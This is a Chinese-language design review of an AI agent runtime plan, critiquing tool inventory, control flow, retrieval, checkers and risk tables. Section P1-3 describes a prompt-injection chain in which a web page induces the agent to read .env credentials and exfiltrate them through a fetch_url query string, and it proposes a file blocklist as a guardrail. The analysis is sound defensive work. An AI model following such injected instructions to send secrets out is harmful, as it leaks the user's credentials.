## 2. P1 级问题（开工前必须解决）

### P1-1 §4 第 11 条「一行都不改 run-loop.ts 的控制流」与 S9 / S10 直接矛盾

S10 人工接管要求「Run 进入 WAITING_FOR_INTERACTION（**循环阻塞在 await**）」——这个 await 只能落在主循环或 settle-batch 的等待点上，必然新增控制流分支；S9 Progress Guard 要「消费 ToolProgress 事件判定还活着」，Guard 的检查点同样在循环体内。

「不得绕过清单」第 11 条按字面执行，S9 / S10 无法实现；按 S9 / S10 执行，第 11 条必被违反。**这不是措辞问题，是实施第一天就会撞上的规则冲突。** 需要改写第 11 条：明确什么不动（五条纪律覆盖的既有控制流语义）、什么允许动（新增等待分支、新增事件消费点），否则纪律条文本身会成为第一个被「例外」掉的东西。

### P1-2 S10「Runtime 请求接管」缺少承载机制

S10 流程图从「Runtime 请求接管」开始，但**谁、通过什么信号请求**没有定义。模型表达「需要人去外部系统操作」的唯一途径是工具调用，而工具清单里没有 `ask_user` / `request_handoff` 类工具（存量 U-8 早有记录：WAITING_FOR_USER 对应的 ask-user 工具不存在）。

这个工具本身三场景都有需求（决 5 自己论证过：办公要人确认外部系统、代码要人解冲突、聊天要人确认发送），完全够格进 `tools/common`，但它不在八个工具之列，也不在任何一批的实施步骤里。**缺了它，`WAITING_FOR_INTERACTION` 依然不可达**——批 3 验收 D 段会无从测起。方案需补：第 9 个工具（或明确复用某种现有通道）及其三场景声明。

### P1-3 决 3「读放开」× `fetch_url` 的数据外泄链路未入风险表

决 3 的理由是「读错文件是信息问题，写错文件是不可逆损失」。但批 2 引入 `fetch_url` 后，这个不对称论证失效：**读是信息问题 ⇒ 信息可以被外发 ⇒ 读 ＋ 外发 ＝ 损失。**

具体链路：workspace 外读放开（S12）→ `read_file` 读到仓库根 `.env`（含真实端点凭证与 BASE_URL）→ 内容进入上下文（SimpleRedaction 只打 `sk-` 形状与 email，非该形态的敏感配置漏网）→ 外部网页注入诱导模型调用 `fetch_url("https://.../?d=<内容>")`——GET 的 query 参数就是外发通道，且 `fetch_url` 的 URL scope 不触发 `OUTSIDE_WORKSPACE`（`effect-resolver.ts:98-102` 只对 FILE / DIRECTORY 判定）。

批 2 验收 C 段验的是「不可信内容不能**创建授权 / 改变 Policy / 自动批准**」，但这条链路不需要创建任何授权——决 3 之下一切本已放行。§8 风险表必须补这一条，并至少给出最小护栏，例如：

- 读放开的黑名单仍拒 `.env` / `.git` / `.workagent-state`；
- 或 `fetch_url` 仅接受任务原文中出现过的 URL。

不需要推翻决 3（单人本地开发期可接受），但「已知且有通道的风险不写入风险表」违反方案自己的证据纪律。

### P1-4 S6 的 retrieval「按需取回」没有定义取回通路

S6【定】说「retrieval 必须让模型能按需取回——否则外置就成了另一种形式的静默截断」，批 2 验收 A 段也断言「模型可经 retrieval 取回完整内容」。但**取回的机制不存在**：现有 `BlobStorePort` 只有 `put / get`（ports/index.ts:341-344），模型侧没有任何工具能消费 `ref`。

取回通路只能是又一个工具（如 `read_blob(ref, offset?, limit?)`），它同样要过三场景声明、三必填项、进工具账本。方案批 1 的工具清点漏了这一环——**「八个工具」的边界从批 2 起就不成立**，§5.2 退出门槛与批 1 验收 E 段的固定开销基线都需要把它算进去。

### P1-5 `delay_ms` 不是现存独立工具，迁移代价清单不全

方案 §2.1 说留在 micro-cases 的是「`append_log` 与 `delay_ms`」，但现状代码里 **`delay_ms` 只是 `write_note` 的一个参数**（`cases/micro-cases/src/index.ts:76`），`microCaseTools` 一共 4 个工具，没有 delay_ms 工具。

write_note 迁走改名 write_file 并「去掉 delay_ms」后，「执行到一半取消」的测量旋钮**消失**，必须新建独立工具；同时 `apps/cli/src/verify/pairing.ts:135` 的判据「write_note ＋ delay_ms:800 ＋ 定时 cancel」失去载体，需要改写——新 delay_ms 工具测的是「延迟被取消」，与「写文件执行到一半被取消」不是同一个不变量场景。

§2.5「迁移的一处真实代价」只讲了 resume 快照问题，这一处完全漏掉。顺带：4 ≠ 3（迁移）＋ 2（留下），方案的工具数量账从一开始就没对上。

## 3. P2 级问题（实施中会踩，建议修订）

**P2-1 批 1 验收 E 段「打印 8 个工具的 fixedOverheadTokens」时序错误。** 批 1 结束时 tools/common 只有 7 个工具（list_dir / write_file / now / read_file / stat / search / edit_file），`fetch_url` 在批 2 S7。E 段数字与批次时序不符。

**P2-2 S13 跨场景 smoke 缺聊天场景。** 决 2 的分拣标准是三场景，三场景声明是三道闸门之二，但唯一能证伪「通用」的 S13 只跑办公 ＋ 代码两个任务。聊天场景的工具用例（读消息导出、search 定位、产纪要）从头到尾没有真实执行过。要么补第三个任务，要么在方案里写明聊天场景可以缺席的论据（例如其文件形态与办公场景无差异）——现在这样，退出门槛「通用性成立」的证明力度比方案自己声称的弱一档。

**P2-3 S13 任务 A 用 `append_log` 收尾，自相矛盾。** §2.1 刚论证完 append_log「是测量工具，不是办公工具——三场景标准一条都不满足」，S13 任务 A 的压力表就写「产出结构化文档 **＋ 追加日志**」。用一个被判「不满足任何场景标准」的工具去完成办公任务的最后一步，恰好是「能力面被测量需求反向定义」的现场示范。任务 A 去掉「追加日志」即可，或者诚实地把 append_log 迁进 tools/common。

**P2-4 system prompt 仍指向 `write_note`，迁移步骤没提它。** `compose.ts:380` 的 DEFAULT_SYSTEM_PROMPT 写着「需要写文件时使用 write_note」。工具改名后不改这句，模型会被引导调用不存在的工具名。更重要的是：决 6 论证「提升思考能力的方式是扩能力面**与上下文质量**」——上下文质量最直接的载体就是 system prompt 和 8 个工具的 description（模型的操作手册），但除了 §2.2 的三个必填项，方案对这部分的迁移与重写只字未提。这是「思考能力」论点落地时最便宜也最被忽视的抓手。

**P2-5 S8「经探针证实是误判」强于证据现状，且文档口径分裂。** 探针脚本存在（393 行，未提交），但其 A 段是 H2 假说的字面分析、B-D 段的「5/5、0/5→5/5」数值仅记载于方案本身，原始输出未入库；同时回归评测报告正文仍是 H1 口径（归因模型遗漏）。两份文档现在各说各话。S14 回写清单应把评测报告的口径更正列入（否则误导后续评测设计），探针脚本与输出建议按 `sxw_aicoding/` 惯例入库——决 6 的整条证据链有一环目前不可复核。

**P2-6 Markdown 检查器可能是「永远绿灯的闸门」。** 任何文本都是合法 Markdown，「Markdown 可解析」没有判别力——这恰是方案自己在批 2 验收 F 段和 §8 风险表里反复警告的形态。要么给它定义具体的结构断言（标题层级存在、正文非空、列表缩进一致等可失败项），要么从首批检查器里去掉。JSON / ZIP / 编码 / hash 四项有明确判别力，不受此影响。

**P2-7 批 2 验收 C 段后半在决 3 之下可能恒真。** 「不可信内容不能自动批准 Action」——决 3 已把审批默认放行，**所有** Action 本来就自动批准，「不可信内容不能批准」无从失败。C 段有判别力的只有前半（trustSummary 汇总正确）；后半要么删掉，要么改成一个真正可失败的断言（例如「hasExternalUntrusted 为 true 时 trace 里必须出现相应事实记录」）。

**P2-8 `requiredCapabilities`「唯一留白」的表述不成立。** 现有 4 个工具都声明了它（如 `list-dir.ts:44`），新工具按同样模板都会声明 `fs.read` / `fs.write` / `net.fetch`——批 1 一结束，零消费字段就从「唯一一处」膨胀为「每工具一处」。要么新工具不声明它（需确认类型是否可选），要么把 S12 的注释义务改为逐工具。这与「未接线比不写更糟」的纪律直接相关。

**P2-9 两个 Port 的现有接口形态承载不了方案语义，接口重设计的工作量与风险未列。** `ArtifactStorePort.register(input: unknown)` / `markVerified(id, ok)`（ports/index.ts:331-334）无法表达 §17 的版本链、Tombstone、lineage 查询、来源 Run 关联、Deliverable-Verified 标记。这不是「实现 Port」而是「重新设计 Port」——而 D-14 的盲写警告恰恰针对「没有用例检验就定接口」的形态。好在批 2 的顺序（先工具后 Port）缓解了它，但方案应明说「S8 包含接口重设计」，否则按「接口已定、只差实现」的预期排期会失真。

## 4. P3 级（建议性）

- **stdin 三方复用**：interject 提交（S1）、接管完成确认（S10）、审批 `rl.question`（U-2 修复）三条通道抢同一个 stdin，语义区分（等待态下回车＝完成、非等待态回车＝插话？）需要一个小设计，方案未提。
- **「多次不同调用但外部状态无变化」缺廉价实现路径**：判定「外部状态无变化」需要状态观察基础设施，现无。第一条形态（同 Tool ＋ 同 input ＋ 同 digest）可从 transcript 机械判定；第二条建议降级为「连续 N 次不同调用且 Verification 结果无状态变化」这类可实现的代理判据，或明说推后。
- **AGENTS.md 不在 S14 回写清单**：新增 `tools/` 层改变了仓库结构约定与依赖方向（apps → packages / adapters / cases / **tools**），AGENTS.md 的「Project Structure」段需要同步——CLAUDE.md 可以等，AGENTS.md 不行，它是每个会话都生效的工作区指令。
- **`recoveryObservation` 类型仍是可选**（`tool.ts:163` 带 `?`）：方案说「三个必填项」，redaction / idempotency 已是类型必填，recoveryObservation 只靠 verify 扫描兜底。要么去 `?`，要么接受「类型说可选、纪律说必填」的缝隙并写明。
- **`fetch_url` 的 effect 声明形态**：scopeKind 枚举目前只有 FILE / DIRECTORY / NONE，URL scope 需要扩展枚举并在 policy 里明确「网络读取无 workspace 概念」的语义，属实施时必遇的设计点。
- **§8 风险表建议补一行「新射程上思考短板暴露」**：决 6 的四条证据全部来自「目录元数据盘点」这一种极简任务形态；批 1 后工具射程扩大约一倍、S13 任务复杂度上台阶，「瓶颈不在思考」可能失效。处置不是阶段内加编排（那违反决 6），而是**记录证据、留评测阶段判定**——把这条写进风险表，才能防止实施者中途看到短板后私自加 Planner，或反过来无视证据。

## 5. 对核心立场（通用能力 vs 网页归档）的评估

针对「Atlas 是通用能力、网页归档只是评测 Case 之一」的项目立场，**这份方案是迄今最系统的一次落实，且落实方式是机械可复核的而非口号式的**：

| 层 | 机制 |
|---|---|
| 目录 | 决 1：不建 `cases/web-archive/`，一行都不建 |
| 分拣 | 决 2：三场景标准（办公 / 代码 / 聊天） |
| 声明 | 三场景文件头 ＋ 机械扫描（批 1 验收 B 段） |
| 依赖 | 第 6b 条边界 grep：通用工具不得依赖 Case 包，注入即翻红 |
| 执行 | S13 跨场景 smoke：不同场景任务用同一套工具跑通 |
| 经济 | fixedOverheadTokens 基线：「一个 Case 一套工具」直接反映在每次请求成本上 |

五层防线中，语义层面的过拟合只有 smoke 能抓住——方案对此有清醒认识（§0.2「前两道只能防止显式依赖，防不了形状是照着某个任务长的」），这个判断是对的。

两个残留缺口：

1. **「通用」的证明只覆盖 2/3 场景**（P2-2）：聊天场景在声明层存在、在执行层缺席。
2. **「通用思考能力」的建设完全寄托在工具面与上下文质量上**：这个立场有实测支撑且与上位基线一致，但「上下文质量」最直接的载体（system prompt、工具 description，P2-4）在方案里恰恰没有着落——而它是零成本就能做的。决 6 不加 Planner 是对的；风险表给「短板转移」留一条记录路径（P3 末条）会让这个决定更稳。
